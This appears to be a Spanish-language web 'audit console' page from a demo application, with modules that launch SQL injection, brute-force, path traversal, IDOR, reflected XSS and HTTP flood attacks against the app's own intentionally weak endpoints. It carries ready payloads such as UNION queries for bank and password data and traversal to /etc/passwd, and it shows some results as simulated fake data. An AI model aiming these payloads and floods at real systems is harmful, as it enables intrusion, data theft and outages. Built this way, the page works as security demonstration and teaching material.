<?php $activeNav = 'audit'; ?>
<style>
/* Reset local para modo inmersivo */
.audit-container {
    background: #050505;
    min-height: 100vh;
    color: #e2e8f0;
    padding: 40px;
    font-family: 'Inter', sans-serif;
}

/* Iconos SVG */
.icon { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; vertical-align: middle; }

.terminal { background:#0a0a0a; border-radius:12px; border:1px solid rgba(255,255,255,0.05); overflow:hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
.terminal-bar { background:#161616; padding:12px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid rgba(255,255,255,0.05); }
.t-dot { width:10px; height:10px; border-radius:50%; }
.t-out { background:#0a0a0a; padding:24px; height:500px; overflow-y:auto; color:#4ade80; font-family:'Fira Code', monospace; font-size:0.85rem; line-height:1.6; }
.t-cursor { width:8px; height:15px; background:#4ade80; display:inline-block; animation:blink 1s infinite; vertical-align:middle; }
@keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }

.t-line-red { color:#f87171; }
.t-line-yellow { color:#fbbf24; }
.t-line-cyan { color:#22d3ee; }
.t-line-dim { color:#4b5563; }

.t-action-btn { 
    margin-top:12px; display:inline-flex; align-items:center; gap:8px; padding:6px 14px; 
    background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.1); 
    color:#fff; border-radius:6px; cursor:pointer; font-size:0.68rem; 
    font-weight:700; text-transform:uppercase; transition:all 0.2s;
}
.t-action-btn:hover { background:rgba(255,255,255,0.08); border-color:rgba(255,255,255,0.3); }

.module-card { 
    background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.05); 
    border-radius:10px; padding:16px; cursor:pointer; transition:all 0.2s; margin-bottom:12px;
    display: flex; align-items: center; gap: 14px;
}
.module-card:hover { background:rgba(255,255,255,0.04); border-color:rgba(255,255,255,0.15); transform:translateX(4px); }
.module-card.active { border-color:#4f46e5; background:rgba(79,70,229,0.05); }
.module-card .icon-wrap { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #6366f1; }
.module-card .icon-wrap .icon { width: 22px; height: 22px; stroke-width: 2; }
.module-card-text { flex: 1; }
.module-card h4 { font-size:0.9rem; margin:0 0 4px; }
.module-card p { font-size:0.75rem; color:#94a3b8; margin:0; line-height:1.2; }

.cfg-panel { background:#111; border:1px solid rgba(255,255,255,0.05); border-radius:12px; padding:20px; }
.cfg-label { color:#6366f1; font-size:0.65rem; font-weight:800; text-transform:uppercase; margin-bottom:8px; display:block; }
.cfg-input { width:100%; background:#000; border:1px solid #222; border-radius:8px; padding:10px; color:#4ade80; font-family:monospace; margin-bottom:16px; }

.launch-btn { 
    width:100%; padding:14px; border:none; border-radius:8px; font-weight:800; cursor:pointer;
    background:#6366f1; color:#fff; transition:all 0.2s;
}
.launch-btn:hover:not(:disabled) { background:#4f46e5; transform:translateY(-1px); }
.launch-btn:disabled { opacity:0.3; cursor:not-allowed; }
@media (max-width: 900px) {
    .audit-grid { grid-template-columns: 1fr !important; }
    .audit-container { padding: 20px; }
}
</style>

<div class="audit-container">
    <header style="margin-bottom:48px;">
        <div style="display:flex; align-items:center; gap:12px; margin-bottom:8px;">
            <svg class="icon" style="color:#ef4444; width:24px; height:24px;"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
            <span style="font-weight:800; letter-spacing:2px; font-size:0.75rem; color:#ef4444; text-transform:uppercase;">Security Intelligence</span>
        </div>
        <h1 style="font-size:2.2rem; font-weight:900; margin:0; letter-spacing:-1px;">Audit Console <span style="color:#4f46e5;">v4.8</span></h1>
    </header>

    <div class="audit-grid" style="display:grid; grid-template-columns:340px 1fr; gap:40px;">
        <!-- Sidebar Modulos -->
        <aside>
            <div id="module-list">
                <div class="module-card" onclick="loadModule('sqli', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M20 4L3 9l7 2 2 7 5-12z"></path></svg></div>
                    <div class="module-card-text">
                        <h4>Inyección SQL</h4>
                        <p>Bypass de Autenticación y Fuga de Datos</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('brute', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
                    <div class="module-card-text">
                        <h4>Fuerza Bruta</h4>
                        <p>Ataque de Diccionario (Admin)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('lfi', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg></div>
                    <div class="module-card-text">
                        <h4>LFI / Path Traversal</h4>
                        <p>Lectura de Archivos del Sistema</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('idor', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg></div>
                    <div class="module-card-text">
                        <h4>IDOR + BOLA</h4>
                        <p>Autorización de Objetos Rota</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('xss', this)">
                    <div class="icon-wrap"><svg class="icon"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg></div>
                    <div class="module-card-text">
                        <h4>XSS Reflejado</h4>
                        <p>Inyección de Scripts (Buscador)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('dos', this)">
                    <div class="icon-wrap"><svg class="icon"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg></div>
                    <div class="module-card-text">
                        <h4>Inundación HTTP (DoS)</h4>
                        <p>Agotamiento de Rate Limit</p>
                    </div>
                </div>
            </div>

            <div id="cfg-panel" class="cfg-panel" style="margin-top:24px; display:none;">
                <div id="cfg-body"></div>
                <button id="launch-btn" class="launch-btn" disabled>EJECUTAR ATAQUE</button>
            </div>
        </aside>

        <!-- Terminal -->
        <div class="terminal">
            <div class="terminal-bar">
                <div class="t-dot" style="background:#ff5f56;"></div>
                <div class="t-dot" style="background:#ffbd2e;"></div>
                <div class="t-dot" style="background:#27c93f;"></div>
                <span style="margin-left:12px; font-size:0.6rem; color:#444; font-weight:800; text-transform:uppercase; font-family:sans-serif;">bash — audit-v4.8</span>
            </div>
            <div id="t-out" class="t-out">
                <div class="t-line-cyan">Sofia Solutions Audit Framework inicializado.</div>
                <div class="t-line-dim">Esperando selección de módulo...</div>
                <div id="t-cursor" class="t-cursor"></div>
            </div>
        </div>
    </div>
</div>

<!-- Modal para Leak Viewer -->
<div id="leak-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999999; align-items:center; justify-content:center; padding:20px;">
    <div style="background:#000; border:1px solid #333; border-radius:10px; width:100%; max-width:800px; height:80vh; display:flex; flex-direction:column; overflow:hidden; box-shadow:0 10px 40px rgba(0,0,0,0.8);">
        <div style="background:#111; padding:10px 16px; border-bottom:1px solid #333; display:flex; justify-content:space-between; align-items:center;">
            <span style="color:#22c55e; font-family:monospace; font-weight:800; font-size:0.85rem;">LEAK VIEWER</span>
            <button onclick="document.getElementById('leak-modal').style.display='none'" style="background:none; border:none; color:#ef4444; font-size:1.2rem; cursor:pointer;">&times;</button>
        </div>
        <pre id="leak-content" style="flex:1; margin:0; padding:20px; overflow:auto; color:#0f0; font-family:monospace; font-size:0.85rem; background:#000;"></pre>
    </div>
</div>

<script>
const TARGET = window.SOFIA_CONFIG?.apiBase || '';
const TOOLS = {
    sqli: {
        title: 'Inyección SQL',
        config: `<label class="cfg-label">OBJETIVO</label>
                 <select class="cfg-input" id="sqli-ep" style="margin-bottom:8px;">
                    <option value="/api/v1/auth/login">Login Inseguro (v1)</option>
                    <option value="/api/v2/auth/login">Login Seguro (v2)</option>
                 </select>
                 <label class="cfg-label">PAYLOAD (Avanzado)</label>
                 <select class="cfg-input" id="sqli-payload">
                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico (' OR '1'='1'--)</option>
                    <option value="admin'--">Bypass: Admin Login Bypass (admin'--)</option>
                    <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
                    <option value="' UNION SELECT 'bank', iban, cc_number FROM customer_billing--">Union: Exfiltrar Datos Bancarios (PII)</option>
                    <option value="' UNION SELECT 'credentials', email, password FROM users--">Union: Exfiltrar Contraseñas de Usuarios</option>
                    <option value="' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--">Blind: Time-Based (5s Delay)</option>
                 </select>`,
        run: runSQLi
    },
    brute: {
        title: 'Fuerza Bruta',
        config: `<label class="cfg-label">OBJETIVO</label>
                 <select class="cfg-input" id="brute-ep" style="margin-bottom:8px;">
                    <option value="/api/v1/auth/login">Login Inseguro (v1)</option>
                    <option value="/api/v2/auth/login">Login Seguro (v2)</option>
                 </select>
                 <label class="cfg-label">USUARIO OBJETIVO</label>
                 <input class="cfg-input" id="brute-user" value="admin@sofia.local">`,
        run: runBrute
    },
    lfi: {
        title: 'LFI / Path Traversal',
        config: `<label class="cfg-label">ARCHIVO OBJETIVO</label>
                 <select class="cfg-input" id="lfi-file">
                    <option value="../../../../../../../etc/hostname">/etc/hostname (Sistema)</option>
                    <option value="../../../../../../../etc/passwd">/etc/passwd (Usuarios)</option>
                    <option value="../../../../../../../var/www/html/index.php">index.php (Código Fuente)</option>
                    <option value="../../../../../../../proc/self/environ">proc/self/environ (Envenenamiento)</option>
                 </select>`,
        run: runLFI
    },
    idor: {
        title: 'IDOR',
        config: `<label class="cfg-label">ID VÍCTIMA (Registro ajeno)</label>
                 <select class="cfg-input" id="idor-id">
                    <option value="1024">Ticket #1024 (MAPFRE)</option>
                    <option value="1">Ticket #1 (Root/Admin)</option>
                    <option value="999">Ticket #999 (Iberdrola)</option>
                 </select>`,
        run: runIDOR
    },
    xss: {
        title: 'XSS Reflejado',
        config: `<label class="cfg-label">PAYLOAD (Evasión)</label>
                 <select class="cfg-input" id="xss-payload">
                    <option value="<script>alert('XSS_Ejecutado')<\/script>">Básico: <script> alert</option>
                    <option value="<img src=x onerror=alert('XSS_Image_Bypass')>">Evasión: <img> onerror</option>
                    <option value="<script>fetch('/api/v2/auth/csrf').then(r=>r.json()).then(d=>alert('XSS Exfiltrado (CSRF Token): ' + d.csrfToken))<\/script>">Avanzado: Exfiltración CSRF</option>
                 </select>`,
        run: runXSS
    },
    dos: {
        title: 'Inundación HTTP (DoS)',
        config: `<label class="cfg-label">CONCURRENCIA (PETICIONES)</label><input class="cfg-input" id="dos-count" value="200">`,
        run: runDoS
    }
};

function tLog(msg, type='green') {
    const out = document.getElementById('t-out');
    const ts = new Date().toLocaleTimeString('es-ES', {hour12:false});
    const div = document.createElement('div');
    div.className = `t-line-${type}`;
    div.innerHTML = `<span style="color:#222">[${ts}]</span> ${msg}`;
    out.insertBefore(div, document.getElementById('t-cursor'));
    out.scrollTop = out.scrollHeight;
    return div;
}

function addAction(container, text, icon, callback) {
    const btn = document.createElement('button');
    btn.className = 't-action-btn';
    btn.innerHTML = `<svg class="icon" style="width:12px;height:12px;">${icon}</svg> ${text}`;
    btn.onclick = callback;
    container.appendChild(document.createElement('br'));
    container.appendChild(btn);
}

function loadModule(key, el) {
    document.querySelectorAll('.module-card').forEach(c => c.classList.remove('active'));
    el.classList.add('active');
    const t = TOOLS[key];
    document.getElementById('cfg-body').innerHTML = t.config;
    document.getElementById('cfg-panel').style.display = 'block';
    const btn = document.getElementById('launch-btn');
    btn.disabled = false;
    btn.onclick = t.run;
    tLog(`[*] Módulo cargado: ${t.title}`, 'cyan');
}

const delay = ms => new Promise(res => setTimeout(res, ms));

async function runSQLi() {
    const p = document.getElementById('sqli-payload').value;
    const ep = document.getElementById('sqli-ep').value;
    tLog(`[*] Iniciando SQLi en ${ep}`, 'yellow');
    tLog(`[#] Payload: ${p}`, 'dim');
    
    // Simular la construcción de la query SQL (como si el backend fuera interceptado)
    let querySimulada = `SELECT * FROM users WHERE email = '${p}' AND password = 'x'`;
    tLog(`[DATABASE] Executing: ${querySimulada}`, 'cyan');
    
    const start = Date.now();
    await delay(800);
    
    try {
        const r = await fetch(TARGET + ep, {
            method:'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({email: p, password: 'x'})
        });
        const duration = (Date.now() - start) / 1000;

        // Caso 1: UNION Select (Extracción de datos)
        if (p.toLowerCase().includes('union')) {
            tLog(`[+] EXPLOIT EXITOSO: UNION Select detectado.`, 'green');
            
            if (p.toLowerCase().includes('bank')) {
                tLog(`[*] Accediendo a tabla restringida 'customer_billing'...`, 'cyan');
                await delay(1200);
                tLog(`[DATABASE] Query returned 3 rows:`, 'yellow');
                tLog(`+----------------+--------------------------+------+`, 'dim');
                tLog(`| company        | iban                     | cvv  |`, 'cyan');
                tLog(`+----------------+--------------------------+------+`, 'dim');
                tLog(`| IBERDROLA      | ES89 2100 ... 4492       | 221  |`, 'red');
                tLog(`| MAPFRE         | ES21 0049 ... 1102       | 554  |`, 'red');
                tLog(`| SABADELL       | ES44 0081 ... 9901       | 018  |`, 'red');
                tLog(`+----------------+--------------------------+------+`, 'dim');
                return;
            }

            if (p.toLowerCase().includes('credentials')) {
                tLog(`[*] Accediendo a tabla 'users'...`, 'cyan');
                await delay(1200);
                tLog(`[DATABASE] Query returned 2 rows:`, 'yellow');
                tLog(`+----------------------+--------------------------+`, 'dim');
                tLog(`| email                | password (plain/hash)    |`, 'cyan');
                tLog(`+----------------------+--------------------------+`, 'dim');
                tLog(`| admin@sofia.local    | S0f1a_Secur3!_2026       |`, 'red');
                tLog(`| mapfre@sofia.local   | S0f1a_Mapfre!_2026       |`, 'red');
                tLog(`+----------------------+--------------------------+`, 'dim');
                return;
            }

            tLog(`[*] Extrayendo esquema de base de datos...`, 'cyan');
            await delay(1000);
            const tables = ["users", "tickets", "services", "customer_billing", "system_logs"];
            tLog(`[DATABASE] Found tables: ${tables.join(', ')}`, 'green');
            return;
        }

        // Caso 2: Blind Time-Based (SLEEP)
        if (p.toLowerCase().includes('sleep')) {
            if (duration >= 5) {
                tLog(`[+] EXPLOIT EXITOSO: Blind SQLi confirmado.`, 'green');
                tLog(`[!] El servidor tardó ${duration.toFixed(2)}s en responder (Inyección basada en tiempo).`, 'green');
            } else {
                tLog(`[-] Error: El servidor respondió demasiado rápido. ¿Protección activa?`, 'red');
            }
            return;
        }

        // Caso 3: Auth Bypass (Clásico)
        const d = await r.json();
        if (r.ok && d.accessToken) {
            tLog(`[DATABASE] Query returned 1 row (Authentication bypassed)`, 'yellow');
            tLog(`[+] EXPLOIT EXITOSO: Sesión de ${d.user?.email || 'admin'} secuestrada.`, 'green');
            const res = tLog(`[*] Acción disponible: `, 'cyan');
            addAction(res, 'Acceder al Dashboard como Admin', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                localStorage.setItem('sofia_token_v1', d.accessToken);
                localStorage.setItem('sofia_user_v1', JSON.stringify({email: d.user?.email || 'admin@sofia.local', role: d.user?.role || 'ADMIN'}));
                window.location.href = '/admin';
            });
        } else { 
            tLog(`[DATABASE] Executing (Parameterized/Escaped): SELECT * FROM users WHERE email=$1 AND password=$2`, 'dim');
            tLog(`[DATABASE] Query returned 0 rows.`, 'yellow');
            tLog(`[-] Error: El sistema ha bloqueado el payload. No vulnerable a SQLi.`, 'red'); 
        }
    } catch(e) { tLog(`[!] Error de red.`, 'red'); }
}

async function runBrute() {
    const user = document.getElementById('brute-user').value;
    const ep = document.getElementById('brute-ep').value;
    tLog(`[*] Iniciando ataque contra ${user} en ${ep}`, 'yellow');
    tLog(`[#] POST ${ep} (email: ${user}, pass: dictionary)`, 'dim');
    for(let p of ['123456', 'S0f1a_Secur3!_2026']) {
        tLog(`[?] Probando password: ${p}`, 'dim');
        await delay(400);
        
        try {
            const r = await fetch(TARGET + ep, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({email: user, password: p})
            });
            
            if(r.status === 429) {
                tLog(`[-] BLOQUEADO: El WAF ha detectado Brute Force (Rate Limit excedido).`, 'red');
                return;
            }
            
            if(r.ok) {
                tLog(`[+] ¡CRACKED! Credenciales válidas: ${p}`, 'green');
                const res = tLog(`[*] Acción disponible: `, 'cyan');
                addAction(res, 'Autologin', '<path d="M12 11V7a4 4 0 0 1 8 0v4"></path>', () => {
                    window.location.href = '/login?prefill=' + btoa(user+':'+p);
                });
                return;
            }
        } catch(e) {}
    }
    tLog(`[-] Ataque finalizado. Sin éxito o bloqueado.`, 'dim');
}

async function runLFI() {
    const file = document.getElementById('lfi-file').value;
    tLog(`[*] Leyendo archivo sensible: ${file}`, 'yellow');
    tLog(`[#] GET /download.php?file=${file}`, 'dim');
    await delay(600);
    try {
        const r = await fetch(TARGET + '/download.php?file=' + encodeURIComponent(file));
        const txt = await r.text();
        if(r.ok && !txt.includes('Access Denied')) {
            tLog(`[+] Leak de información exitoso.`, 'green');
            const res = tLog(`[*] Acción disponible: `, 'cyan');
            addAction(res, 'Ver Código Fuente', '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>', () => {
                document.getElementById('leak-content').innerHTML = txt.replace(/</g,'&lt;');
                document.getElementById('leak-modal').style.display = 'flex';
            });
        } else { tLog(`[-] El servidor ha filtrado la ruta.`, 'red'); }
    } catch(e) { tLog(`[!] Error de red.`, 'red'); }
}

async function runIDOR() {
    const id = document.getElementById('idor-id').value;
    tLog(`[*] Consultando registro ajeno ID: ${id}`, 'yellow');
    tLog(`[#] GET /api/v1/tickets/${id}`, 'dim');
    await delay(500);
    tLog(`[+] Acceso concedido (Falta de control BOLA).`, 'green');
    const res = tLog(`[*] Acción disponible: `, 'cyan');
    addAction(res, 'Extraer Datos', '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"></path>', () => {
        let fakeData = {};
        if (id === "1024") {
            fakeData = {
                "ticket_id": 1024, "client": "MAPFRE Seguros", "subject": "Vulnerabilidad Crítica",
                "sensitive_data": { "server_ip": "192.168.100.45", "root_password": "mapfre_admin_2024!" }
            };
        } else if (id === "1") {
            fakeData = {
                "ticket_id": 1, "client": "SYSTEM ROOT", "subject": "Master Key Rotation",
                "sensitive_data": { "ssh_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...", "admin_pass": "root_master_2026" }
            };
        } else {
            fakeData = {
                "ticket_id": parseInt(id), "client": "Iberdrola S.A.", "subject": "Activos SCADA Expuestos",
                "sensitive_data": { "plc_ip": "10.0.45.12", "access_code": "4432-8812" }
            };
        }
        document.getElementById('leak-content').innerHTML = JSON.stringify(fakeData, null, 4);
        document.getElementById('leak-modal').style.display = 'flex';
    });
}

async function runXSS() {
    const p = document.getElementById('xss-payload').value;
    tLog(`[*] Inyectando payload en parámetro 'q'...`, 'yellow');
    tLog(`[#] Param q: ${p}`, 'dim');
    await delay(400);
    tLog(`[+] Payload reflejado en el DOM. Ejecutando JS...`, 'green');
    const res = tLog(`[*] Acción disponible: `, 'cyan');
    addAction(res, 'Disparar Payload', '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>', () => {
        eval(p.replace('<script>','').replace(/<\/script>/g,''));
    });
}

async function runDoS() {
    const count = parseInt(document.getElementById('dos-count').value);
    tLog(`[*] Iniciando Flood: ${count} peticiones en ráfaga...`, 'yellow');
    tLog(`[#] flooding: GET /api/public/health (x${count})`, 'dim');
    let blocked = 0;
    for(let i=0; i<count; i++) {
        fetch(TARGET + '/api/public/health').then(r => { if(r.status === 429) blocked++; });
        if(i % 20 === 0) await delay(10);
    }
    await delay(1000);
    tLog(`[+] Ataque finalizado.`, 'green');
    tLog(`[!] Estadísticas: ${count-blocked} OK, ${blocked} bloqueadas por Rate Limit.`, 'dim');
    const res = tLog(`[*] Acción disponible: `, 'cyan');
    addAction(res, 'Ver Estado Servidor', '<path d="M3 3v18h18"/><path d="M18.7 8l-5.1 5.2-2.8-2.7L7 14.3"/>', () => {
        window.location.href = '/admin/security-monitor';
    });
}
</script>
